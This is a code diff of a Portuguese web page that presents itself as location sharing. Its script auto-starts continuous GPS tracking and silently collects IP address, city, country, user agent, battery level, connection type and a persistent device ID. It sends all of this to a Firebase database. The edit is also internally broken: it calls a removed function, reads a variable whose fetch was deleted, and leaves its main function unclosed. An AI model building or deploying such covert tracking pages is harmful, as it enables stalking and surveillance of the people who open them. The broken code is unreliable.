@@ -6,7 +6,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Compartilhando localização</title>
+<title>Compartilhar localização</title>
 
 </head>
 
@@ -17,7 +17,7 @@
 <script type="module">
 
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
 const firebaseConfig = {
 
@@ -29,28 +29,37 @@ storageBucket:"ferramentas-projeto.appspot.com",
 messagingSenderId:"877191590019",
 appId:"1:877191590019:web:152d4d35bdd3024c53abb6"
 
-};
+}
 
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
+const app = initializeApp(firebaseConfig)
+const db = getDatabase(app)
 
-/* iniciar automaticamente */
+let id = localStorage.getItem("uid")
+
+if(!id){
+
+id = Math.random().toString(36).substr(2,9)
+localStorage.setItem("uid",id)
+
+}
+
+function start(){
 
 navigator.geolocation.watchPosition(async pos=>{
 
-let lat = pos.coords.latitude;
-let lng = pos.coords.longitude;
+let lat = pos.coords.latitude
+let lng = pos.coords.longitude
 
-/* pegar cidade e ip */
+let bateria = "N/A"
 
-let req = await fetch("https://ipapi.co/json/");
-let info = await req.json();
+if(navigator.getBattery){
 
-/* dados do dispositivo */
+let bat = await navigator.getBattery()
+bateria = Math.floor(bat.level*100)+"%"
 
-let celular = navigator.userAgent;
+}
 
-/* salvar no firebase */
+let conexao = navigator.connection ? navigator.connection.effectiveType : "N/A"
 
 push(ref(db,"localizacoes"),{
 
@@ -59,12 +68,14 @@ longitude:lng,
 cidade:info.city,
 pais:info.country_name,
 ip:info.ip,
-celular:celular,
+celular:navigator.userAgent,
 data:Date.now()
 
-});
+})
 
-});
+/* inicia automaticamente */
+
+start()
 
 </script>
 
